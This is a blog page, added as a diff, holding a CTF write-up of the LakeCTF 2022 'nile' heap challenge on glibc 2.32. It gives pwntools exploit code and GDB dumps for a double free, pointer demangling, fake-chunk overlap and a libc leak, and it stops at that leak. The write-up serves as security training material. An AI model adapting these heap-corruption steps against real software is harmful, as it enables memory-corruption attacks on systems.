@@ -1,0 +1,986 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="HandheldFriendly" content="True">
+<meta name="MobileOptimized" content="320">
+<meta name="theme-color" content="#2ecc71">
+
+
+
+
+
+<title>LakeCTF Qualifications 2022 - nile | kileak</title>
+
+
+
+
+
+<meta name="description" content="LakeCTF Qualifications 2022 - nile">
+
+
+<meta name="keywords" content="lakectf, nile">
+
+
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+
+
+
+
+
+
+<link rel="canonical" href="https://kileak.github.io/ctf/2022/lakectf-nile/">
+<link rel="alternate" type="application/rss+xml" title="kileak" href="https://kileak.github.io/feed.xml" />
+
+
+
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-4PGFKKP0QW"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-4PGFKKP0QW');
+</script>
+
+
+<script>base_url = "";</script>
+
+  </head>
+  <body class="">
+
+    <main class="main-container">
+
+        <header class="site-header">
+
+  <div class="container txt-center">
+    <a href="#" class="nav-toogle js-menu-trigger sliding-panel-button">
+      <span></span>
+      <span></span>
+      <span></span>
+    </a>
+
+    <nav class="js-menu sliding-panel-content">
+      <ul>
+        <li><a href="/">home</a></li>
+        <li><a href="https://www.youtube.com/channel/UCi-IXmtQLrJjg5Ji78DqvAg/videos" target="_blank">youtube</a></li>
+        <li><a href="/feed.xml" target="_blank"><i class="icon icon-feed"></i> feed</a></li>
+      </ul>
+    </nav>
+    <div class="js-menu-screen sliding-panel-fade-screen"></div>
+
+    <a href="/" class="author-thumb dot">
+      <img src="/images/author.jpg" alt="Author thumbnail" class="dot">
+    </a>
+
+    <!--
+    <a href="https://www.youtube.com/channel/UCi-IXmtQLrJjg5Ji78DqvAg/videos" target="_blank" class="youtube-thumb dot">
+      <img src="/images/youtube-icon.png" alt="Youtube" class "dot">
+    </a>
+    -->
+
+    
+      <h1 class="post-title">LakeCTF Qualifications 2022 - nile</h1>
+      <p class="post-meta">Sep 25, 2022</p>
+    
+
+  </div>
+
+</header>
+
+
+        <section class="main-content">
+          <article class="post">
+
+  <div class="post-content container">
+    <blockquote>
+  <p>LakeCTF Qualifications 2022 - nile
+<!--break--></p>
+
+  <p>When I wrote this challenge, glibc 2.32 was the latest and greatest, so I made sure I could exploit this on 2.27, 2.29, 2.31 and 2.32. I only expect you to do the 2.32 version ;)</p>
+
+  <p>nc chall.polygl0ts.ch 3800</p>
+
+  <p>Team: Super Guesser</p>
+
+  <p>Attachment: <a href="https://kileak.github.io/assets/lakectf2022/nile/nile">nile</a> <a href="https://kileak.github.io/assets/lakectf2022/nile/libc-2.32.so">libc-2.32.so</a> <a href="https://kileak.github.io/assets/lakectf2022/nile/Dockerfile">Dockerfile</a> <a href="https://kileak.github.io/assets/lakectf2022/nile/ld-2.32.so">ld-2.32.so</a> <a href="https://kileak.github.io/assets/lakectf2022/nile/xpl.py">xpl.py</a></p>
+</blockquote>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">Welcome to Nile, the newest and most advanced publishing and selling platform known to mankind.
+Would you like to:
+        1. Add a fake endorsement
+        2. Add a brief description
+        3. Review your current entries
+        4. Remove some data
+        5. Upgrade your plan
+        6. quit
+
+&gt;</code></pre></figure>
+
+<p><code class="language-plaintext highlighter-rouge">nile</code> was kind of your regular heap note challenge, where you can add, view and free chunks. But it had some twists, which made it quite hard to exploit.</p>
+
+<p>With adding a fake endorsement we can add <code class="language-plaintext highlighter-rouge">0x30</code> chunks and adding descriptions will create <code class="language-plaintext highlighter-rouge">0x50</code> chunks. All chunks are allocated via <code class="language-plaintext highlighter-rouge">calloc</code>, so <code class="language-plaintext highlighter-rouge">tcache</code> cannot be abused, because <code class="language-plaintext highlighter-rouge">calloc</code> will not serve chunks from <code class="language-plaintext highlighter-rouge">tcache</code>. So the easy path via <code class="language-plaintext highlighter-rouge">tcache</code> poisoning is not feasible :(</p>
+
+<p>Also, since the challenge is using <code class="language-plaintext highlighter-rouge">libc-2.32</code>, we have to keep in mind, that we cannot directly use double frees, since <code class="language-plaintext highlighter-rouge">tcache</code> will check for that. But we can get around this, by first freeing 7 chunks regularly into <code class="language-plaintext highlighter-rouge">tcache</code>. After <code class="language-plaintext highlighter-rouge">tcache</code> is filled, the following frees will be handled in <code class="language-plaintext highlighter-rouge">main_arena</code>, which enables us to use double free again.</p>
+
+<p>With this, we can start leaking heap values (again, <code class="language-plaintext highlighter-rouge">libc-2.32</code> is used, so heap addresses will be mangled).</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">r</span><span class="p">):</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">)</span>
+
+    <span class="c1"># create initial chunks
+</span>    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">12</span><span class="p">):</span> 
+        <span class="n">adddesc</span><span class="p">(</span><span class="mh">0x20</span><span class="o">-</span><span class="mi">8</span><span class="p">,</span> <span class="s">"A"</span><span class="o">*</span><span class="p">(</span><span class="mh">0x20</span><span class="o">-</span><span class="mi">8</span><span class="p">))</span>
+    
+    <span class="c1"># fillup tcache 
+</span>    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>  
+        <span class="n">remove</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
+
+    <span class="c1"># upgrade to be able to allocate more chunks
+</span>    <span class="n">upgrade</span><span class="p">()</span>
+    
+    <span class="c1"># double free first chunk
+</span>    <span class="n">remove</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+    <span class="n">remove</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+    <span class="n">remove</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+
+    <span class="c1"># add a new chunk (0 and 11 will now point to the same chunk)
+</span>    <span class="n">adddesc</span><span class="p">(</span><span class="mh">0x20</span><span class="o">-</span><span class="mi">8</span><span class="p">,</span> <span class="s">"A"</span><span class="p">)</span>    <span class="c1"># 11
+</span>
+    <span class="c1"># free chunk 0
+</span>    <span class="n">remove</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+
+    <span class="c1"># leak heap value from chunk 11 (which is now freed)
+</span>    <span class="n">LEAK</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">review</span><span class="p">()[:</span><span class="o">-</span><span class="mi">1</span><span class="p">].</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">))</span>
+
+    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"LEAK       : %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">LEAK</span><span class="p">))</span></code></pre></figure>
+
+<p>One thing to note for this… When developing the exploit locally with ASLR disabled, the leak will look wrong.</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">$ python xpl.py
+[*] '/home/kileak/ctf/lake/nilework/libc-2.32.so'
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+[+] Starting local process './nile': pid 53115
+[53115]
+[*] Paused (press any to continue)
+[*] LEAK       : 0x835d</code></pre></figure>
+
+<p>This happens, because the mangled heap address will contain null bytes.</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">0x55555555d5b0:	0x0000000000000000	0x0000000000000051
+0x55555555d5c0:	0x000055500000835d	0x0000000000000000 &lt;= mangled ptr
+0x55555555d5d0:	0x0000000000000000	0x0000000000000000
+0x55555555d5e0:	0x0000000000000000	0x0000000000000000
+0x55555555d5f0:	0x0000000000000000	0x0000000000000000
+0x55555555d600:	0x0000000000000000	0x0000000000000051</code></pre></figure>
+
+<p>Though with ASLR enabled, it will not contain any null bytes most of the time and can just be read this way.</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">kileak@beast:~/ctf/lake/nilework$ python xpl.py 
+[*] '/home/kileak/ctf/lake/nilework/libc-2.32.so'
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+[+] Starting local process './nile': pid 53219
+[53219]
+[*] Paused (press any to continue)
+[*] LEAK       : 0x55681185831f</code></pre></figure>
+
+<p>But while developing the exploit, we don’t want to activate ASLR, so, since we know that the leak will work correctly remote, we can just add a small fix to let our exploit also work locally with ASLR deactivated.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1"># leak heap value from chunk 11 (which is now freed)
+</span><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">"/proc/sys/kernel/randomize_va_space"</span><span class="p">,</span> <span class="s">"r"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+  <span class="n">state</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="n">read</span><span class="p">()[</span><span class="mi">0</span><span class="p">]</span>
+
+<span class="k">print</span><span class="p">(</span><span class="n">hexdump</span><span class="p">(</span><span class="n">state</span><span class="p">))</span>
+<span class="n">ASLR</span> <span class="o">=</span> <span class="n">state</span> <span class="o">==</span> <span class="s">"2"</span>
+
+<span class="k">if</span> <span class="n">LOCAL</span> <span class="ow">and</span> <span class="ow">not</span> <span class="n">ASLR</span><span class="p">:</span>      
+  <span class="n">LEAK</span> <span class="o">=</span> <span class="mh">0x000055500000835d</span> <span class="c1"># 0x000055500000811d
+</span><span class="k">else</span><span class="p">:</span>
+  <span class="n">LEAK</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">review</span><span class="p">()[:</span><span class="o">-</span><span class="mi">1</span><span class="p">].</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">))</span>
+
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"LEAK       : %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">LEAK</span><span class="p">))</span></code></pre></figure>
+
+<p>So, when we’re running locally and ASLR is disabled, we just set the value, it “should” be and from here on, we can debug it with and without ASLR the same.</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">$ python xpl.py 
+[*] '/home/kileak/ctf/lake/nilework/libc-2.32.so'
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+[+] Starting local process './nile': pid 54387
+[54387]
+[*] Paused (press any to continue)
+[*] LEAK       : 0x55500000835d</code></pre></figure>
+
+<p>This will give us a mangled heap pointer, which can luckily be reversed to get to the real heap address.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="k">def</span> <span class="nf">demangle</span><span class="p">(</span><span class="n">obfus_ptr</span><span class="p">):</span>
+    <span class="n">o2</span> <span class="o">=</span> <span class="p">(</span><span class="n">obfus_ptr</span> <span class="o">&gt;&gt;</span> <span class="mi">12</span><span class="p">)</span> <span class="o">^</span> <span class="n">obfus_ptr</span>
+    <span class="k">return</span> <span class="p">(</span><span class="n">o2</span> <span class="o">&gt;&gt;</span> <span class="mi">24</span><span class="p">)</span> <span class="o">^</span> <span class="n">o2</span>
+
+<span class="p">...</span>
+
+<span class="n">HEAP</span> <span class="o">=</span> <span class="n">demangle</span><span class="p">(</span><span class="n">LEAK</span><span class="p">)</span></code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">$ python xpl.py 
+[*] '/home/kileak/ctf/lake/nilework/libc-2.32.so'
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+[+] Starting local process './nile': pid 54785
+[54785]
+[*] Paused (press any to continue)
+[*] LEAK       : 0x55500000835d
+[*] HEAP       : 0x55555555d600</code></pre></figure>
+
+<p>This wasn’t too hard, but from here the real pain began (also not having a debug version of libc/ld at hand didn’t make it any better).</p>
+
+<p>We have a double free, but since it’s handled via <code class="language-plaintext highlighter-rouge">calloc</code>, the chunks have to be 16 byte aligned and they need to have a correct size (0x50 or 0x30), so we cannot just allocate anywhere…</p>
+
+<p>But let’s start with the obvious things first. We need a <code class="language-plaintext highlighter-rouge">libc</code> leak.</p>
+
+<p>For this, it would be useful to free a chunk, that will not be handled as a fastbin, but we can only create <code class="language-plaintext highlighter-rouge">0x30</code> and <code class="language-plaintext highlighter-rouge">0x50</code> chunks… Except, when doing an upgrade: This will allocate a <code class="language-plaintext highlighter-rouge">0xc00</code> chunk on the heap, in which the chunks of the professional plan will be stored.</p>
+
+<p>If we could free this chunk, we would get some <code class="language-plaintext highlighter-rouge">main_arena</code> pointers onto the heap, which we might be able to leak afterwards, so let’s start with that.</p>
+
+<p>While preparing the previous heap leak, I also triggered the <code class="language-plaintext highlighter-rouge">upgrade</code> functionality. This was done on purpose, since after the leak, we still have a double freed pointer in <code class="language-plaintext highlighter-rouge">main_arena</code> and also already having allocated the <code class="language-plaintext highlighter-rouge">0xc00</code> chunk for the professional plan on the heap.</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">main_arena
+
+0x7ffff7fc19f0:	0x0000000000000000	0x0000000000000000
+0x7ffff7fc1a00:	0x0000000000000000	0x0000000000000001
+0x7ffff7fc1a10:	0x0000000000000000	0x0000000000000000
+0x7ffff7fc1a20:	0x0000000000000000	0x000055555555d5b0 &lt;= 0x50 free chunk
+0x7ffff7fc1a30:	0x0000000000000000	0x0000000000000000
+0x7ffff7fc1a40:	0x0000000000000000	0x0000000000000000
+0x7ffff7fc1a50:	0x0000000000000000	0x0000000000000000
+0x7ffff7fc1a60:	0x000055555555e260	0x0000000000000000
+0x7ffff7fc1a70:	0x00007ffff7fc1a60	0x00007ffff7fc1a60
+0x7ffff7fc1a80:	0x00007ffff7fc1a70	0x00007ffff7fc1a70
+
+gef➤  x/30gx 0x000055555555d5b0
+0x55555555d5b0:	0x0000000000000000	0x0000000000000051
+0x55555555d5c0:	0x000055500000835d	0x0000000000000000
+0x55555555d5d0:	0x0000000000000000	0x0000000000000000
+0x55555555d5e0:	0x0000000000000000	0x0000000000000000
+
+0x000055500000835d ^ 0x55555555d = 0x55555555d600
+
+gef➤  x/30gx 0x000055555555d600
+0x55555555d600:	0x0000000000000000	0x0000000000000051
+0x55555555d610:	0x00005550000080ed	0x4141414141414141
+0x55555555d620:	0x4141414141414141	0x0000000000000000
+0x55555555d630:	0x0000000000000000	0x0000000000000000
+0x55555555d640:	0x0000000000000000	0x0000000000000000
+0x55555555d650:	0x0000000000000000	0x0000000000000c11  &lt;= insert fake chunk here
+0x55555555d660:	0x000055555555d5c0	0x0000000000000040  &lt;= pro plan chunk
+0x55555555d670:	0x0000000000000000	0x0000000000000000
+
+0x00005550000080ed ^ 0x55555555d = 0x55555555d5b0</code></pre></figure>
+
+<p>We’ll use the next allocation to overwrite the FD pointer of the first chunk with a pointer pointing to the pro_plan chunk.</p>
+
+<p>After that we’ll allocate the next chunk (which is directly above the pro plan chunk) and now put a valid chunk size above the pro_plan chunk.</p>
+
+<p>The next allocation will then get our fake chunk on top of the pro plan, and since we put a valid chunk size there, it should succeed.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">GUARD</span> <span class="o">=</span> <span class="n">HEAP</span> <span class="o">&gt;&gt;</span> <span class="mi">12</span>
+
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"HEAP guard : %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">GUARD</span><span class="p">))</span>
+
+<span class="c1"># overwrite FD of double freed chunk with pointer above pro plan chunk
+</span><span class="n">adddesc</span><span class="p">(</span><span class="mh">0x20</span><span class="o">-</span><span class="mi">8</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">HEAP</span><span class="o">+</span><span class="mh">0x40</span><span class="o">^</span><span class="n">GUARD</span><span class="p">))</span>
+
+<span class="c1"># create size for fake 0x50 chunk before pro_plan chunk
+</span><span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x51</span><span class="p">)[:</span><span class="mi">1</span><span class="p">]</span>
+
+<span class="n">adddesc</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">),</span> <span class="n">payload</span><span class="p">)</span>
+
+<span class="c1"># get fake FD into main_arena
+</span><span class="n">adddesc</span><span class="p">(</span><span class="mh">0x20</span><span class="o">-</span><span class="mi">8</span><span class="p">,</span> <span class="s">"C"</span><span class="o">*</span><span class="p">(</span><span class="mh">0x20</span><span class="o">-</span><span class="mi">8</span><span class="p">))</span></code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">adddesc(0x20-8, p64(HEAP+0x40^GUARD))
+
+0x55555555d5b0:	0x0000000000000000	0x0000000000000051
+0x55555555d5c0:	0x000055500000831d	0x0000000000000000 &lt;= overwritten FD
+0x55555555d5d0:	0x0000000000000000	0x0000000000000000
+0x55555555d5e0:	0x0000000000000000	0x0000000000000000
+0x55555555d5f0:	0x0000000000000000	0x0000000000000000
+0x55555555d600:	0x0000000000000000	0x0000000000000051
+
+0x000055500000831d ^ 0x55555555d = 0x55555555d640 (points above pro plan chunk)
+
+adddesc(len(payload), payload)
+
+0x55555555d600:	0x0000000000000000	0x0000000000000051
+0x55555555d610:	0x0000000000000000	0x0000000000000000
+0x55555555d620:	0x0000000000000000	0x0000000000000000
+0x55555555d630:	0x0000000000000000	0x0000000000000000
+0x55555555d640:	0x0000000000000000	0x0000000000000051 &lt;= fake chunk size
+0x55555555d650:	0x0000000000000000	0x0000000000000c11
+0x55555555d660:	0x000055555555d5c0	0x0000000000000040
+
+adddesc(0x20-8, "C"*(0x20-8))
+
+0x7ffff7fc19f0:	0x0000000000000000	0x0000000000000000 &lt;= main_arena
+0x7ffff7fc1a00:	0x0000000000000000	0x0000000000000001
+0x7ffff7fc1a10:	0x0000000000000000	0x0000000000000000
+0x7ffff7fc1a20:	0x0000000000000000	0x000055555555d640 &lt;= PTR to our fake chunk
+0x7ffff7fc1a30:	0x0000000000000000	0x0000000000000000
+0x7ffff7fc1a40:	0x0000000000000000	0x0000000000000000
+0x7ffff7fc1a50:	0x0000000000000000	0x0000000000000000</code></pre></figure>
+
+<p>The next <code class="language-plaintext highlighter-rouge">0x50</code> allocation will thus serve our fake chunk, with which we can overwrite the first bytes from the pro_plan chunk.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1"># allocate fake chunk and overwrite pro_plan chunk
+</span><span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xc11</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">HEAP</span><span class="o">+</span><span class="mh">0x60</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x40</span><span class="p">)</span>   <span class="c1"># chunk ptr / size
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">HEAP</span><span class="o">+</span><span class="mh">0x60</span><span class="p">)</span>    <span class="c1"># is_freed / chunk_ptr
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x40</span><span class="p">)</span>                    <span class="c1"># size
+</span>
+<span class="n">adddesc</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">),</span> <span class="n">payload</span><span class="p">)</span></code></pre></figure>
+
+<p>This will put a pointer to the pro_plan itself into the first pro chunk slot, which we could now free to get a free bin on the heap, but this will trigger <code class="language-plaintext highlighter-rouge">malloc_consolidate</code>, which will notice, that our chunks are totally messed up and abort.</p>
+
+<p><code class="language-plaintext highlighter-rouge">malloc_consolidate(): unaligned fastbin chunk detected</code></p>
+
+<p>But luckily, we can get around this, by creating a dummy endorsement, which will fix this for us.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1"># create endorsement to avoid crash in malloc_consolidate
+</span><span class="n">addfake</span><span class="p">(</span><span class="mh">0x20</span><span class="o">-</span><span class="mi">8</span><span class="p">,</span> <span class="s">"A"</span><span class="p">)</span>
+
+<span class="c1"># free pro_plan chunk (free unsorted bin now)
+</span><span class="n">remove</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>			</code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">0x55555555d640:	0x0000000000000000	0x0000000000000051
+0x55555555d650:	0x0000000000000000	0x0000000000000c11
+0x55555555d660:	0x00007ffff7fc1a60	0x00007ffff7fc1a60
+0x55555555d670:	0x0000000000000000	0x0000000000000000
+0x55555555d680:	0x0000000000000000	0x0000000000000001
+0x55555555d690:	0x0000000000000000	0x0000000000000040
+0x55555555d6a0:	0x0000000000000000	0x000055555555d5c0
+0x55555555d6b0:	0x0000000000000040	0x0000000000000000
+0x55555555d6c0:	0x000055555555d650	0x0000000000000040
+0x55555555d6d0:	0x0000000000000000	0x000055555555e270
+0x55555555d6e0:	0x0000000000000020	0x0000000000000000</code></pre></figure>
+
+<p>Ok, so finally some libc pointers on the heap, now we’ll just need to get them “reviewable”. We have to keep in mind, that any allocation will now be served from the freed bin, thus overwriting the pro plan entries itself and also move the libc addresses down the heap.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1"># allocate chunks pointing to freed unsorted bin address (so they can be reviewed)
+</span><span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">HEAP</span><span class="o">+</span><span class="mh">0x120</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> 
+
+<span class="n">addfake</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">),</span> <span class="n">payload</span><span class="p">)</span>
+<span class="n">addfake</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">),</span> <span class="n">payload</span><span class="p">)</span>
+<span class="n">addfake</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">),</span> <span class="n">payload</span><span class="p">)</span>
+<span class="n">addfake</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">),</span> <span class="n">payload</span><span class="p">)</span></code></pre></figure>
+
+<p>Allocating 4 <code class="language-plaintext highlighter-rouge">0x30</code> chunks in the unsorted bin with pointers to where the main_arena pointers will be after those allocation will result in a valid pro_plan.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="mh">0x55555555d650</span><span class="p">:</span>	<span class="mh">0x0000000000000000</span>	<span class="mh">0x0000000000000031</span>
+<span class="mh">0x55555555d660</span><span class="p">:</span>	<span class="mh">0x000055555555d720</span>	<span class="mh">0x0000000000000000</span> <span class="o">&lt;=</span> <span class="n">slot</span> <span class="mi">1</span> <span class="nb">buffer</span> <span class="o">/</span> <span class="n">slot</span> <span class="mi">1</span> <span class="n">size</span>
+<span class="mh">0x55555555d670</span><span class="p">:</span>	<span class="mh">0x0000000000000000</span>	<span class="mh">0x0000000000000000</span> <span class="o">&lt;=</span> <span class="n">slot</span> <span class="mi">1</span> <span class="n">freed</span>  <span class="o">/</span> <span class="n">slot</span> <span class="mi">2</span> <span class="nb">buffer</span>
+<span class="mh">0x55555555d680</span><span class="p">:</span>	<span class="mh">0x0000000000000000</span>	<span class="mh">0x0000000000000031</span> <span class="o">&lt;=</span> <span class="n">slot</span> <span class="mi">2</span> <span class="n">size</span>   <span class="o">/</span> <span class="n">slot</span> <span class="mi">2</span> <span class="n">freed</span>
+<span class="mh">0x55555555d690</span><span class="p">:</span>	<span class="mh">0x000055555555d720</span>	<span class="mh">0x0000000000000000</span> <span class="o">&lt;=</span> <span class="n">slot</span> <span class="mi">3</span> <span class="nb">buffer</span> <span class="o">/</span> <span class="n">slot</span> <span class="mi">3</span> <span class="n">size</span>
+<span class="mh">0x55555555d6a0</span><span class="p">:</span>	<span class="mh">0x0000000000000000</span>	<span class="mh">0x0000000000000000</span> <span class="o">&lt;=</span> <span class="n">slot</span> <span class="mi">3</span> <span class="n">freed</span>  <span class="o">/</span> <span class="n">slot</span> <span class="mi">4</span> <span class="nb">buffer</span>
+<span class="mh">0x55555555d6b0</span><span class="p">:</span>	<span class="mh">0x0000000000000000</span>	<span class="mh">0x0000000000000031</span> <span class="o">&lt;=</span> <span class="n">slot</span> <span class="mi">4</span> <span class="n">size</span>   <span class="o">/</span> <span class="n">slot</span> <span class="mi">4</span> <span class="n">freed</span>
+<span class="mh">0x55555555d6c0</span><span class="p">:</span>	<span class="mh">0x000055555555d720</span>	<span class="mh">0x0000000000000000</span> <span class="o">&lt;=</span> <span class="n">slot</span> <span class="mi">5</span> <span class="nb">buffer</span> <span class="o">/</span> <span class="n">slot</span> <span class="mi">5</span> <span class="n">size</span>
+<span class="mh">0x55555555d6d0</span><span class="p">:</span>	<span class="mh">0x0000000000000000</span>	<span class="mh">0x0000000000000000</span> <span class="o">&lt;=</span> <span class="n">slot</span> <span class="mi">5</span> <span class="n">freed</span>  <span class="o">/</span> <span class="n">slot</span> <span class="mi">6</span> <span class="nb">buffer</span>
+<span class="mh">0x55555555d6e0</span><span class="p">:</span>	<span class="mh">0x0000000000000000</span>	<span class="mh">0x0000000000000031</span> <span class="o">&lt;=</span> <span class="n">slot</span> <span class="mi">6</span> <span class="n">size</span>   <span class="o">/</span> <span class="n">slot</span> <span class="mi">6</span> <span class="n">freed</span>
+<span class="mh">0x55555555d6f0</span><span class="p">:</span>	<span class="mh">0x000055555555d720</span>	<span class="mh">0x0000000000000000</span> <span class="o">&lt;=</span> <span class="n">slot</span> <span class="mi">7</span> <span class="nb">buffer</span> <span class="o">/</span> <span class="n">slot</span> <span class="mi">7</span> <span class="n">size</span>
+<span class="mh">0x55555555d700</span><span class="p">:</span>	<span class="mh">0x0000000000000000</span>	<span class="mh">0x0000000000000000</span> <span class="o">&lt;=</span> <span class="n">slot</span> <span class="mi">7</span> <span class="n">freed</span>
+<span class="mh">0x55555555d710</span><span class="p">:</span>	<span class="mh">0x0000000000000000</span>	<span class="mh">0x0000000000000b51</span>
+<span class="mh">0x55555555d720</span><span class="p">:</span>	<span class="mh">0x00007ffff7fc1a60</span>	<span class="mh">0x00007ffff7fc1a60</span> <span class="o">&lt;=</span> <span class="n">main_arena</span> <span class="n">pointers</span></code></pre></figure>
+
+<p>Though every second slot has an invalid buffer, this is not an issue anymore, since the <code class="language-plaintext highlighter-rouge">IsFree</code> part of it contains <code class="language-plaintext highlighter-rouge">0x31</code>, so it will be skipped in <code class="language-plaintext highlighter-rouge">review</code> (as it will interpret those as freed notes) and we can just leak the other slots with valid pointers.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1"># leak main arena ptr from review
+</span><span class="n">LEAK</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">review</span><span class="p">()[:</span><span class="mi">6</span><span class="p">].</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">))</span>
+<span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">LEAK</span> <span class="o">-</span> <span class="mh">0x1c2a60</span>
+
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"LIBC leak    : %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">LEAK</span><span class="p">))</span>
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"LIBC         : %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">address</span><span class="p">))</span></code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">[*] LIBC leak    : 0x7ffff7fc1a60
+[*] LIBC         : 0x7ffff7dff000</code></pre></figure>
+
